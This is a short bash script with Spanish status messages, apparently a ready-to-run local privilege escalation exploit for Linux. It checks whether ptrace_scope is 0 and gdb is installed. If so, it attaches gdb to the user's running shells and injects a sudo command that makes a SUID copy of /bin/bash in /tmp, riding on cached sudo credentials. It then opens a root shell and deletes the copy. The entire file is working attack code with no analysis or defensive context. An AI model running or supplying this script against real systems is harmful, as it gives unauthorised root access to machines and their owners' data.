#!/bin/bash

function startAttack(){
  tput civis && pgrep "$(cat /etc/shells | grep -v "shells" | tr '/' ' '| awk 'NF{print $NF}' | sort -u | xargs | tr ' ' '|' )" -u "$(id -u )" | while read shell_pid; do
    if [ $(cat /proc/$shell_pid/comm 2>/dev/null) ] || [ $(pwdx $shell_pid 2>/dev/null) ]; then
      echo "$shell_pid"
      echo "[*] Path $(pwdx $shell_pid 2>/dev/null)"
      echo "[*] PID -> "$(cat "/proc/$shell_pid/comm" 2>/dev/null)
    fi; echo 'call system("echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1")' | gdb -q -n -p "$shell_pid" >/dev/null 2>&1
    done

    if [ -f /tmp/bash ]; then
      /tmp/bash -p -c 'echo -ne "\n[*] Limpiando..."
                       rm /tmp/bash
                       echo -ne "\n[*] Opteniendo shell root...\n"
                       tput cnorm && bash -p'
    else
      echo -e "\n[*] No fue posible copiar SUID a /tmp/bash          [✗]"
    fi
}
echo -ne "[*] Verificando 'ptrace_scope' ..."
if grep -q "0" < /proc/sys/kernel/yama/ptrace_scope; then
  
  echo -ne "[*] Verificando 'GDB' ..."
  if command -v gdb >/dev/null 2>&1; then
    echo -e "         [√]"
    echo -e "[*] Sistema es vulnerable!"

    startAttack
 
  else
    echo "         [✗]"
    echo "[*] Sistema no es Vulnerable :(               [✗]"
  fi
else
  echo " [✗]"
  echo "[*] Sistema no es vulnerable :(               [✗]"
fi; tput cnorm
